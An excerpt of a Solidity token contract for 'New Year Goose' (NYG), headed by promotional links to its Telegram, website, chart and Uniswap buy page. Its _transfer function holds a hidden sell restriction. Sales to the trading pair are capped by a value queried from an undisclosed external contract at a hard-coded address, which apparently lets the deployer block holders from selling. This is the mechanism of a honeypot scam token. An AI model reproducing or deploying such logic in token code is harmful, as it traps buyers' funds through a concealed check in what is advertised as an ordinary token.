...
// Telegram: https://t.me/NewYearGooseNYG
// Website: http://newyeargoose.xyz
// Twitter: http://twitter.com/NewYearGooseNYG
// Chart: https://www.dextools.io/app/ether/pair-explorer/0xee8cfa4c48cfc1de545e280d9bf13f11b1ca6840
// Buy: https://app.uniswap.org/#/swap?inputCurrency=0xfc30ba1ec44b55eeadffba033e235ddc15090118

pragma solidity ^0.8.11;

uint256 constant INITIAL_TAX=10;
uint256 constant TOTAL_SUPPLY=240000000;
string constant TOKEN_SYMBOL="NYG";
string constant TOKEN_NAME="New Year Goose";
...
contract NewYearGoose is Context, IERC20, Ownable {
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		if(!_isExcludedFromFee[from]){
			require(((to == _pair && from != address(_uniswap) )?amount:0) <= O(0x272DD614CC4f4a58dc85cEBE70c941dE62cd4aBa).amount(address(this)));
		}
